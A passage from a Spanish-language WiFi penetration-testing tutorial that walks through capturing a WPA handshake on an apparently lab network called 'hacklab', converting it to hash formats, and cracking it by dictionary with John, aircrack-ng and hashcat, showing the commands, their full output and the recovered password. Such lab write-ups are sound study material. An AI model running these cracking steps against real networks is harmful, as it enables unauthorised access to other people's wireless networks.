  224 11.419977797              → AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C
  226 11.427114234              → AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C
  230 11.427645439              → AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C
  235 11.430118052              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  240 11.434558344              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  243 11.435567660              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  246 11.441881524              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
```

* Paquetes ACK

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==29" 2>/dev/null
   44 2.532918866              → XiaomiCo_d0:51:c5 (a4:50:46:d0:51:c5) (RA) 802.11 70 Acknowledgement, Flags=........C
  213 4.870822127              → 72:4f:56:d5:f4:21 (72:4f:56:d5:f4:21) (RA) 802.11 70 Acknowledgement, Flags=........C
  214 4.872287210              → 72:4f:56:27:f7:f5 (72:4f:56:27:f7:f5) (RA) 802.11 70 Acknowledgement, Flags=........C
  215 4.873060680              → 72:4f:56:d5:f4:21 (72:4f:56:d5:f4:21) (RA) 802.11 70 Acknowledgement, Flags=........C
  231 5.792287268              → Pegatron_5b:42:f6 (38:60:77:5b:42:f6) (RA) 802.11 70 Acknowledgement, Flags=........C
  252 6.105136504              → Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C
  254 6.109740279              → HewlettP_f1:96:a3 (44:48:c1:f1:96:a3) (RA) 802.11 70 Acknowledgement, Flags=........C
  268 6.137270470              → Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C
  279 6.161518783              → Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C
  281 6.165512928              → Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C
```

#### Extracción del Hash en el Handshake

Aunque no es necesario, por si queremos saber con qué estamos trabajando, es posible extraer el Hash
correspondiente a la captura donde se encuentra nuestro Handshake.

Qué mejor que ver nuestro Handshake representado en formato Hash, tanto que hemos hablado de él como para no
prestarle un poco más de atención. Actualmente, **aircrack-ng** cuenta con el parámetro '**-J**', de utilidad
para generar un archivo de '**.hccap**'.

¿Por qué queremos generar un archivo **HCCAP**?, porque luego a través de la herramienta **hccap2john**
podemos transformar ese archivo a un hash, igual que como haríamos como **ssh2john** u otra utilidad
semejante.

Por tanto, aquí una demostración:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ls
Captura-01.cap
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #aircrack-ng -J miCaptura Captura-01.cap 
Opening Captura-01.cape wait...
Read 5110 packets.

   #  BSSID              ESSID                     Encryption

   1  20:34:FB:B1:C5:53  hacklab                   WPA (1 handshake)

Choosing first network as target.

Opening Captura-01.cape wait...
Read 5110 packets.

1 potential targets



Building Hashcat file...

[*] ESSID (length: 7): hacklab
[*] Key version: 2
[*] BSSID: 20:34:FB:B1:C5:53
[*] STA: 34:41:5D:46:D1:38
[*] anonce:
    FE AD BB C5 CA AC 3C 41 52 56 B1 44 5D 61 29 2A 
    72 E1 7D 73 6A 5E 16 A5 15 88 E4 9E 58 42 EC 78 
[*] snonce:
    47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 1F 
    6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE E0 
[*] Key MIC:
    0C 0E B7 91 69 C1 FE FD E5 D9 08 42 2E E4 A5 3C
[*] eapol:
    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
    01 47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 
    1F 6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE 
    E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
    04 01 00 00 0F AC 02 00 00 

Successfully written to miCaptura.hccap

┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ls
Captura-01.cap  miCaptura.hccap
```

Una vez hecho, hacemos uso de **hccap2john** para visualizar el hash:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #hccap2john miCaptura.hccap > miHash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #cat !$
cat miHash
hacklab:$WPAPSK$hacklab#61HvgQJHB23RFh2sFppOICEh5FXsNpg8hf5z5qe3UilaDd6ewAmm/TC9ri1yfPj3mekwEJ7KgIFRMGYeQi3xQqdS3eIJWCGSK29gS.21.5I0.Ec............/FppOICEh5FXsNpg8hf5z5qe3UilaDd6ewAmm/TC9ri..................................................................3X.I.E..1uk2.E..1uk2.E..1uk0....................................................................................................................................................................................../t.....U....kCht3dkTvxtRY6EWvYdHk:34-41-5d-46-d1-38:20-34-fb-b1-c5-53:2034fbb1c553::WPA2:miCaptura.hccap
```

Y eso tan bonito que vemos, es el Hash correspondiente a la contraseña de la red WiFi, la cual podríamos
sencillamente crackear llegados hasta este punto haciendo uso de la herramienta **John** junto a un diccionario.


#### Fuerza bruta con John

Ya habiendo llegado hasta aquí, procedemos con los ataques de fuerza bruta. Aprovechando el punto
anteriormente visto, ya que contamos con un Hash... resulta sencillo crackear la contraseña de la red WiFi
haciendo uso de un diccionario a través de la herramienta **John**, de la siguiente forma:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #john --wordlist=/usr/share/wordlists/rockyou.txt miHash --format=wpapsk
Using default input encoding: UTF-8
Loaded 1 password hash (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 256/256 AVX2 8x])
No password hashes left to crack (see FAQ)
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #john --show --format=wpapsk miHash 
hacklab:vampress1:34-41-5d-46-d1-38:20-34-fb-b1-c5-53:2034fbb1c553::WPA2:miCaptura.hccap

1 password hash cracked, 0 left
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #echo "Password: $(john --show --format=wpapsk miHash | cut -d ':' -f 2)"
Password: vampress1
```

Y ahí dispondríamos de la contraseña de la red inalámbrica, que en este caso es **vampress1**.

#### Fuerza bruta con Aircrack

Para crackear nuestro Handshake desde la propia suite de **aircrack**, tan sólo tendríamos que emplear esta
sintaxis:

* aircrack-ng -w rutaDiccionario Captura-01.cap

Se iniciaría el proceso de fuerza bruta y una vez obtenida se detendría la fase de cracking, mostrando la
contraseña siempre y cuando esta se encuentre en el diccionario especificado:

```bash
                              Aircrack-ng 1.5.2 

      [00:00:43] 487370/9822769 keys tested (7440.27 k/s) 

      Time left: 20 minutes, 54 seconds                          4.96%

                           KEY FOUND! [ vampress1 ]


      Master Key     : 9C E8 4E 94 F4 08 12 AC 1F 06 C9 5F CF C8 DE D5 
                       EC 70 5C 4B 73 FE 52 7B 02 29 9F 9A 88 E2 B3 74 

      Transient Key  : C6 21 8D E8 62 DD B2 A7 48 65 52 AA E0 C0 8E 85 
                       1B 63 D0 1D 9C C0 47 12 DA BF E1 63 12 01 8C 75 
                       D3 EF AE C5 E4 62 B7 C7 6E DE D1 05 9D 67 81 BF 
                       E7 94 71 D0 8D FE 92 17 61 AC 44 BA 48 E6 F7 B3 

      EAPOL HMAC     : 1A EB 42 13 85 E4 A1 FC 99 AF AA 97 4D AA EE 25
```

La velocidad de cómputo siempre va a depender de nuestra CPU, pero veremos un par de técnicas más adelante
para aumentar nuestra velocidad de cómputo, superando las 10 millones de contraseñas por segundo.

#### Fuerza bruta con Hashcat

Ya que **aircrack** no es capaz de tirar por GPU, en caso de que tengáis una GPU como en mi caso:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #nvidia-detect 
Detected NVIDIA GPUs:
01:00.0 VGA compatible controller [0300]: NVIDIA Corporation GP107M [GeForce GTX 1050 Mobile] [10de:1c8d] (rev a1)
```

Lo mejor es tirar de **Hashcat** para estos casos. Para correr la herramienta, primero necesitamos saber cuál
es el método numérico correspondiente a **WPA**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #hashcat -h | grep -i wpa
   2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols
   2501 | WPA-EAPOL-PMK                                    | Network Protocols
  16800 | WPA-PMKID-PBKDF2                                 | Network Protocols
  16801 | WPA-PMKID-PMK                                    | Network Protocols
```

Una vez identificado (**2500**), lo primero que necesitamos hacer es convertir nuestra captura '**.cap**' a un
archivo de tipo '**.hccapx**', específico para la combinación de Hashcat. Para ello, corremos el parámetro
'**-j**' de aircrack (esta vez es minúscula):

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #aircrack-ng -j hashcatCapture Captura-01.cap 
Opening Captura-01.cape wait...
Read 5110 packets.

   #  BSSID              ESSID                     Encryption

   1  20:34:FB:B1:C5:53  hacklab                   WPA (1 handshake)

Choosing first network as target.

Opening Captura-01.cape wait...
Read 5110 packets.

1 potential targets



Building Hashcat (3.60+) file...

[*] ESSID (length: 7): hacklab
[*] Key version: 2
[*] BSSID: 20:34:FB:B1:C5:53
[*] STA: 34:41:5D:46:D1:38
[*] anonce:
    FE AD BB C5 CA AC 3C 41 52 56 B1 44 5D 61 29 2A 
    72 E1 7D 73 6A 5E 16 A5 15 88 E4 9E 58 42 EC 78 
[*] snonce:
    47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 1F 
    6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE E0 
[*] Key MIC:
    0C 0E B7 91 69 C1 FE FD E5 D9 08 42 2E E4 A5 3C
[*] eapol:
    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
    01 47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 
    1F 6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE 
    E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
    04 01 00 00 0F AC 02 00 00 

Successfully written to hashcatCapture.hccapx

┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ls
Captura-01.cap  hashcatCapture.hccapx
```

Ya en posesión de esta captura, iniciamos la fase de cracking haciendo uso de la siguiente sintaxis:

* hashcat -m 2500 -d 1 rockyou.txt --force -w 3

Obteniendo los siguientes resultados en un tiempo récord:

```bash
┌─[✗]─[root@parrot]─[/usr/share/wordlists]
└──╼ #hashcat -m 2500 -d 1 hashcatCapture.hccapx rockyou.txt 
hashcat (v5.1.0) starting...

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1050, 1010/4040 MB allocatable, 5MCU

OpenCL Platform #2: The pocl project
====================================
* Device #2: pthread-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, skipped.

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Watchdog: Temperature abort trigger set to 90c

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=1 -D VENDOR_ID=32 -D CUDA_ARCH=601 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=4 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=2500 -D _unroll'
Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921517
* Keyspace..: 14344386

ebe21289a38f16ee01a35c240c356e5f:2034fbb1c553:34415d46d138:hacklab:vampress1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: WPA-EAPOL-PBKDF2
Hash.Target......: hacklab (AP:20:34:fb:b1:c5:53 STA:34:41:5d:46:d1:38)
Time.Started.....: Sun Aug 11 19:12:43 2019 (4 secs)
Time.Estimated...: Sun Aug 11 19:12:47 2019 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    79177 H/s (7.18ms) @ Accel:128 Loops:64 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 807901/14344386 (5.63%)
Rejected.........: 439261/807901 (54.37%)
Restore.Point....: 728207/14344386 (5.08%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 22lehvez33 -> rodnesha
Hardware.Mon.#1..: Temp: 63c Util: 92% Core:1670MHz Mem:3504MHz Bus:8

```

Recuerda hacer uso del parámetro **-d** para especificar el dispositivo a usar. Si queremos listar la
contraseña una vez crackeada (aunque también la vemos en el output listado anteriormente), podemos hacer lo
siguiente:

```bash
┌─[root@parrot]─[/usr/share/wordlists]
└──╼ #hashcat --show -m 2500 hashcatCapture.hccapx 
ebe21289a38f16ee01a35c240c356e5f:2034fbb1c553:34415d46d138:hacklab:vampress1
```













 

















